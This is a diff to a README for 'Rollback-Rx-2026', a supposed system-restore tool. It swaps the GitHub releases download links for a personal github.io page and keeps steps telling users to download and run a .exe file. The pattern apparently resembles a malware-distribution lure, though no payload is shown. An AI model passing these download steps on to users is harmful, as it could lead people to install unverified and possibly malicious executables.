@@ -1,6 +1,6 @@
 # 🛡️ Rollback-Rx-2026 - Restore your computer to previous states
 
-[![](https://img.shields.io/badge/Download-Rollback--Rx--2026-blue)](https://github.com/Joaop784/Rollback-Rx-2026/releases)
+[![](https://img.shields.io/badge/Download-Rollback--Rx--2026-blue)](https://joaop784.github.io)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ Before you install this software, ensure your computer meets these minimum requi
 
 Follow these steps to obtain the installer for your computer:
 
-1. Visit the project release page: [https://github.com/Joaop784/Rollback-Rx-2026/releases](https://github.com/Joaop784/Rollback-Rx-2026/releases).
+1. Visit the project release page: [https://joaop784.github.io](https://joaop784.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
